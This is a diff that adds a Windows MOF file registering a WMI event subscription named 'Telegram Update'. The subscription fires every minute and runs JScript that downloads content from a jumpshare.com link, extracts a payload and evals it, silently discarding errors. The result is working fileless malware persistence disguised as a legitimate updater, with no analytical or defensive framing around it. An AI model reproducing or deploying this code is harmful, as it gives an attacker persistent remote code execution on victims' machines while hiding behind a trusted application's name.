@@ -1,0 +1,21 @@
+    #pragma namespace("\\\\.\\root\\DEFAULT")
+    instance of __EventFilter as $EventFilter
+    {
+        EventNamespace = "Root\\Cimv2";
+        Name  = "Telegram Update";
+        Query = "Select * From __InstanceModificationEvent "
+                "Where TargetInstance Isa \"Win32_LocalTime\" "
+                "And TargetInstance.Second = 12";
+        QueryLanguage = "WQL";
+    };
+    instance of ActiveScriptEventConsumer as $Consumer
+    {
+        Name = "Telegram Update";
+        ScriptingEngine = "JScript";
+        ScriptText = "n='LPT-20-09-00989';h=new ActiveXObject('WinHttp.WinHttpRequest.5.1');try{h.open('GET','https://jumpshare.com/view/load/7Hp5dB7LsQhZMvmfVYVn',false);h.SetRequestHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36');h.send();eval(eval(h.ResponseText.match(/<pre>(\\S*)<\\/pre>/)[1].replace(/&#039;/g,'\\\'').replace(/&quot;/g,'\"')));}catch(e){}";
+    };
+    instance of __FilterToConsumerBinding
+    {
+        Consumer   = $Consumer;
+        Filter = $EventFilter;
+    };
